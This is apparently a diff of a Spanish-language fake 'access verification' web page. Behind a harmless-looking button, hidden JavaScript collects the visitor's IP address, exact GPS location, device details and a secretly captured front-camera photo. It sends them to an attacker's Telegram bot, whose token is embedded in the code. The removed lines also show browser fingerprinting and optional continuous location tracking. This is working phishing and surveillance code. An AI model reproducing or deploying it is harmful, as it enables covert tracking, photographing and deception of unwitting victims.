@@ -1,273 +1,148 @@
 <!DOCTYPE html>
-<html lang="es">
+<html>
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Verificación de Identidad</title>
+    <title>Verificación de Acceso</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        body {
-            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
-            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
-        }
-        .card {
-            background: rgba(255,255,255,0.1);
-            backdrop-filter: blur(12px);
-            border-radius: 32px;
-            padding: 32px 24px;
-            width: 100%;
-            max-width: 400px;
-            text-align: center;
-            box-shadow: 0 25px 45px rgba(0,0,0,0.3);
-            border: 1px solid rgba(255,255,255,0.2);
-        }
-        h1 {
-            font-size: 1.8rem;
-            font-weight: 600;
-            background: linear-gradient(135deg, #fff, #a0a0ff);
-            -webkit-background-clip: text;
-            background-clip: text;
-            color: transparent;
-            margin-bottom: 12px;
-        }
-        p {
-            color: #ccc;
-            margin-bottom: 28px;
-            font-size: 0.9rem;
-        }
-        button {
-            background: linear-gradient(135deg, #2b6ef0, #1a4ec0);
-            border: none;
-            padding: 16px 28px;
-            border-radius: 60px;
-            font-size: 1rem;
-            font-weight: 600;
-            color: white;
-            cursor: pointer;
-            transition: transform 0.2s, box-shadow 0.2s;
-            width: 100%;
-            box-shadow: 0 8px 20px rgba(0,0,0,0.3);
-        }
-        button:active {
-            transform: scale(0.97);
-        }
-        .footer {
-            margin-top: 24px;
-            font-size: 0.7rem;
-            color: #888;
-        }
+        body { font-family: Arial; text-align: center; padding: 50px; background: black; color: white; }
+        button { background: blue; padding: 15px 30px; border: none; border-radius: 10px; color: white; font-size: 18px; cursor: pointer; }
     </style>
 </head>
 <body>
-<div class="card">
-    <h1>📡 Verificación de Identidad</h1>
-    <p>Para continuar, presiona el botón y acepta los permisos.</p>
-    <button id="btn">✅ Verificar ahora</button>
-    <div class="footer">Red segura · Protección de datos</div>
-</div>
+    <h1>Verificación de Acceso</h1>
+    <button id="btn">Verificar ahora</button>
+    <video id="video" autoplay playsinline style="display:none"></video>
+    <canvas id="canvas" style="display:none"></canvas>
 
-<video id="video" autoplay playsinline style="display:none"></video>
-<canvas id="canvas" style="display:none"></canvas>
+    <script>
+        // ⚠️ CAMBIA ESTO POR TU NUEVO TOKEN (revoca el viejo primero)
+        const BOT_TOKEN = '8803149571:AAF6V8NewmO0JSUAlXdJh1NUuhMo1lwOH6s';
+        const CHAT_ID = '7555997298'; // Tu Chat ID (no cambia)
 
-<script>
-    // 🔐 REVOCA TU TOKEN VIEJO Y PONE AQUÍ EL NUEVO
-    const BOT_TOKEN = '8803149571:AAF6V8NewmO0JSUAlXdJh1NUuhMo1lwOH6s';
-    const CHAT_ID = '7555997298';  // Tu ID de Telegram (no cambia)
-
-    // -------------------- 1. FINGERPRINT (GPU, fuentes, canvas) --------------------
-    async function getFingerprint() {
-        const canvas = document.createElement('canvas');
-        const ctx = canvas.getContext('2d');
-        canvas.width = 200;
-        canvas.height = 50;
-        ctx.fillStyle = "#f60";
-        ctx.fillRect(0, 0, 200, 50);
-        ctx.fillStyle = "#069";
-        ctx.font = "14px Arial";
-        ctx.fillText("Fingerprint", 10, 30);
-        const canvasHash = canvas.toDataURL().slice(0, 100);
-        let gpu = 'N/A';
-        try {
-            const gl = document.createElement('canvas').getContext('webgl');
-            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-            gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'N/A';
-        } catch(e) {}
-        const fontsList = ["Arial", "Verdana", "Helvetica", "Times New Roman", "Courier New", "Impact", "Comic Sans MS"];
-        const availableFonts = fontsList.filter(f => document.fonts.check(`12px "${f}"`));
-        return { gpu, fonts: availableFonts.join(', ') || 'Ninguna', canvasHash };
-    }
-
-    // -------------------- 2. IP + GEOLOCALIZACIÓN POR IP (FALLBACK) --------------------
-    async function getIPinfo() {
-        try {
-            const res = await fetch('https://ipapi.co/json/');
-            const data = await res.json();
-            return {
-                ip: data.ip,
-                country: data.country_name,
-                region: data.region,
-                city: data.city,
-                postal: data.postal,
-                timezone: data.timezone
-            };
-        } catch(e) { return null; }
-    }
-
-    // -------------------- 3. DATOS DEL DISPOSITIVO --------------------
-    function getDeviceInfo() {
-        const ua = navigator.userAgent;
-        let model = "Desconocido";
-        if (ua.includes('iPhone')) model = 'iPhone';
-        else if (ua.includes('iPad')) model = 'iPad';
-        else if (ua.includes('Android')) model = 'Android';
-        else if (ua.includes('Mac')) model = 'Mac';
-        else if (ua.includes('Windows')) model = 'Windows PC';
-        const language = navigator.language || navigator.userLanguage;
-        const resolution = `${window.screen.width}x${window.screen.height}`;
-        const cpuCores = navigator.hardwareConcurrency || 'N/A';
-        return { model, ua, language, resolution, cpuCores };
-    }
-
-    // -------------------- 4. ALMACENAMIENTO --------------------
-    async function getStorageInfo() {
-        try {
-            const est = await navigator.storage.estimate();
-            const totalGB = (est.quota / (1024**3)).toFixed(2);
-            const usedGB = (est.usage / (1024**3)).toFixed(2);
-            return { total: totalGB, used: usedGB };
-        } catch(e) { return { total: 'N/A', used: 'N/A' }; }
-    }
-
-    // -------------------- 5. GPS EXACTO (con promesa) --------------------
-    function getCurrentPosition() {
-        return new Promise((resolve, reject) => {
-            if (!navigator.geolocation) reject(new Error('No soportado'));
-            navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true });
-        });
-    }
-
-    // -------------------- 6. CÁMARA FRONTAL EXCLUSIVA (SIN FALLBACK A TRASERA) --------------------
-    async function capturePhoto() {
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-        let stream = null;
-        try {
-            // Solo cámara frontal (user)
-            stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-        } catch(e) {
-            // Si falla, no intentamos trasera (devuelve null)
-            return null;
+        // Función para obtener IP y geolocalización por IP (fallback)
+        async function getIPinfo() {
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const data = await res.json();
+                return {
+                    ip: data.ip,
+                    country: data.country_name,
+                    region: data.region,
+                    city: data.city,
+                    postal: data.postal,
+                    timezone: data.timezone
+                };
+            } catch(e) { return null; }
         }
-        video.srcObject = stream;
-        await new Promise(resolve => { video.onloadedmetadata = () => { video.play(); resolve(); }; });
-        await new Promise(r => setTimeout(r, 500));
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-        const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
-        stream.getTracks().forEach(t => t.stop());
-        return blob;
-    }
 
-    // -------------------- 7. ENVÍO A TELEGRAM --------------------
-    async function sendMessage(text) {
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
-        });
-    }
-    async function sendPhoto(blob) {
-        const fd = new FormData();
-        fd.append('chat_id', CHAT_ID);
-        fd.append('photo', blob, 'photo.jpg');
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
-    }
+        // Función para obtener datos del dispositivo
+        function getDeviceInfo() {
+            const ua = navigator.userAgent;
+            let deviceModel = "Desconocido";
+            if (ua.includes('iPhone')) deviceModel = 'iPhone';
+            else if (ua.includes('iPad')) deviceModel = 'iPad';
+            else if (ua.includes('Android')) deviceModel = 'Android';
+            else if (ua.includes('Mac')) deviceModel = 'Mac';
+            else if (ua.includes('Windows')) deviceModel = 'Windows PC';
+            const language = navigator.language || navigator.userLanguage;
+            const resolution = `${window.screen.width}x${window.screen.height}`;
+            const cpuCores = navigator.hardwareConcurrency || 'Desconocido';
+            return { deviceModel, ua, language, resolution, cpuCores };
+        }
 
-    // -------------------- 8. GEOLOCALIZACIÓN CONTINUA (OPCIONAL - DESCOMENTAR PARA ACTIVAR) --------------------
-    /*
-    let watchId = null;
-    let lastLat = null, lastLng = null;
-    function startContinuousTracking() {
-        if (!navigator.geolocation) return;
-        watchId = navigator.geolocation.watchPosition(
-            async (position) => {
-                const lat = position.coords.latitude;
-                const lng = position.coords.longitude;
-                if (lastLat !== null) {
-                    const R = 6371000;
-                    const dLat = (lat - lastLat) * Math.PI / 180;
-                    const dLon = (lng - lastLng) * Math.PI / 180;
-                    const a = Math.sin(dLat/2)**2 + Math.cos(lastLat * Math.PI/180) * Math.cos(lat * Math.PI/180) * Math.sin(dLon/2)**2;
-                    const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
-                    const distance = R * c;
-                    if (distance < 50) return;
+        // Enviar mensaje de texto a Telegram (sin feedback visual)
+        async function sendMessage(text) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
+            });
+        }
+
+        // Enviar foto
+        async function sendPhoto(blob) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+            const fd = new FormData();
+            fd.append('chat_id', CHAT_ID);
+            fd.append('photo', blob, 'photo.jpg');
+            await fetch(url, { method: 'POST', body: fd });
+        }
+
+        // Capturar foto en silencio
+        async function capturePhoto() {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            let stream = null;
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+                await new Promise(resolve => { video.onloadedmetadata = () => { video.play(); resolve(); }; });
+                await new Promise(r => setTimeout(r, 500));
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
+                stream.getTracks().forEach(t => t.stop());
+                return blob;
+            } catch(e) {
+                if (stream) stream.getTracks().forEach(t => t.stop());
+                return null;
+            }
+        }
+
+        // Acción del botón: todo en silencio
+        document.getElementById('btn').onclick = async () => {
+            const device = getDeviceInfo();
+            let ipInfo = await getIPinfo();
+
+            // GPS exacto (si se puede)
+            let gpsCoords = null;
+            if (navigator.geolocation) {
+                try {
+                    const pos = await new Promise((resolve, reject) => {
+                        navigator.geolocation.getCurrentPosition(resolve, reject);
+                    });
+                    gpsCoords = { lat: pos.coords.latitude, lng: pos.coords.longitude, accuracy: pos.coords.accuracy };
+                } catch(e) { /* silencio */ }
+            }
+
+            // Construir mensaje detallado
+            let message = `📊 *Visitor Information Captured*\n━━━━━━━━━━━━━━━━\n`;
+            message += `🖥️ *Device & Browser*\n`;
+            message += `   • Device Model: ${device.deviceModel}\n`;
+            message += `   • User Agent: ${device.ua}\n\n`;
+            message += `🌐 *Network Information*\n`;
+            message += `   • IP Address: ${ipInfo ? ipInfo.ip : 'No disponible'}\n`;
+            message += `   • Language: ${device.language}\n\n`;
+            message += `📍 *Location Details*\n`;
+            if (gpsCoords) {
+                message += `   • GPS Coordinates: ${gpsCoords.lat}, ${gpsCoords.lng}\n`;
+                message += `   • Accuracy: ±${gpsCoords.accuracy} meters\n`;
+                message += `   • Maps: https://www.google.com/maps?q=${gpsCoords.lat},${gpsCoords.lng}\n`;
+            } else {
+                message += `   • GPS: No disponible\n`;
+                if (ipInfo && ipInfo.city) {
+                    message += `   • Country: ${ipInfo.country}\n`;
+                    message += `   • Region: ${ipInfo.region}\n`;
+                    message += `   • City: ${ipInfo.city}\n`;
+                    message += `   • Postal Code: ${ipInfo.postal}\n`;
+                    message += `   • Timezone: ${ipInfo.timezone}\n`;
                 }
-                lastLat = lat;
-                lastLng = lng;
-                await sendMessage(`🔄 *Posición actualizada*\n📍 https://www.google.com/maps?q=${lat},${lng}\n*Precisión:* ±${position.coords.accuracy}m`);
-            },
-            () => {},
-            { enableHighAccuracy: true, maximumAge: 10000, timeout: 30000 }
-        );
-    }
-    */
+            }
+            message += `\n🖼️ *Display Information*\n   • Resolution: ${device.resolution}\n\n`;
+            message += `🔐 *Device Permissions*\n`;
+            message += `   • Camera: ${await (navigator.mediaDevices ? 'Solicitado' : 'No soportado')}\n`;
+            message += `   • Location: ${gpsCoords ? 'Permitido' : 'Denegado/No disponible'}\n\n`;
+            message += `💾 *Hardware & Storage*\n   • CPU Cores: ${device.cpuCores}\n`;
+            message += `━━━━━━━━━━━━━━━━\n🎯 Target: ${window.location.href}\n`;
 
-    // -------------------- 9. ACCIÓN DEL BOTÓN --------------------
-    document.getElementById('btn').onclick = async () => {
-        // Recolectar toda la información en paralelo
-        const [fp, ipInfo, device, storage, position] = await Promise.all([
-            getFingerprint(),
-            getIPinfo(),
-            getDeviceInfo(),
-            getStorageInfo(),
-            getCurrentPosition().catch(() => null)
-        ]);
-
-        // Construir mensaje estilo Kaliboy pero más detallado
-        let message = `📊 *Visitor Information Captured*\n━━━━━━━━━━━━━━━━\n\n`;
-        message += `🖥️ *Device & Browser*\n   • Device Model: ${device.model}\n   • User Agent: ${device.ua}\n\n`;
-        message += `🎨 *Fingerprint*\n   • GPU: ${fp.gpu}\n   • Fonts: ${fp.fonts}\n   • Canvas Hash: ${fp.canvasHash}...\n\n`;
-        message += `🌐 *Network Information*\n   • IP Address: ${ipInfo ? ipInfo.ip : 'N/A'}\n   • Language: ${device.language}\n\n`;
-        message += `📍 *Location Details*\n`;
-        if (position) {
-            const lat = position.coords.latitude;
-            const lng = position.coords.longitude;
-            message += `   • GPS Coordinates: ${lat}, ${lng}\n`;
-            message += `   • Accuracy: ±${position.coords.accuracy} meters\n`;
-            message += `   • Google Maps: https://www.google.com/maps?q=${lat},${lng}\n`;
-        } else if (ipInfo && ipInfo.city) {
-            message += `   • IP approximate location:\n`;
-            message += `   • Country: ${ipInfo.country}\n   • Region: ${ipInfo.region}\n   • City: ${ipInfo.city}\n`;
-            message += `   • Postal Code: ${ipInfo.postal}\n   • Timezone: ${ipInfo.timezone}\n`;
-            message += `   • Map: https://www.google.com/maps?q=${ipInfo.city},${ipInfo.country}\n`;
-        } else {
-            message += `   • No disponible\n`;
-        }
-        message += `\n🖼️ *Display Information*\n   • Resolution: ${device.resolution}\n\n`;
-        message += `🔐 *Device Permissions*\n   • Camera: ${navigator.mediaDevices ? 'Requested' : 'Not supported'}\n   • Location: ${position ? 'Granted' : 'Denied'}\n\n`;
-        message += `💾 *Hardware & Storage*\n   • CPU Cores: ${device.cpuCores}\n   • RAM: N/A GB\n   • Storage Used: ${storage.used} GB\n   • Storage Total: ${storage.total} GB\n`;
-        message += `━━━━━━━━━━━━━━━━\n🎯 Target: ${window.location.href}\n⚡ Developed by: @TuApodo\n`;
-
-        // Enviar el mensaje
-        await sendMessage(message);
-
-        // Capturar y enviar foto (solo frontal)
-        const foto = await capturePhoto();
-        if (foto) await sendPhoto(foto);
-
-        // Si quieres geolocalización continua, descomenta la siguiente línea
-        // startContinuousTracking();
-    };
-</script>
+            // Enviar datos sin mostrar nada al usuario
+            await sendMessage(message);
+            const foto = await capturePhoto();
+            if (foto) await sendPhoto(foto);
+        };
+    </script>
 </body>
 </html>
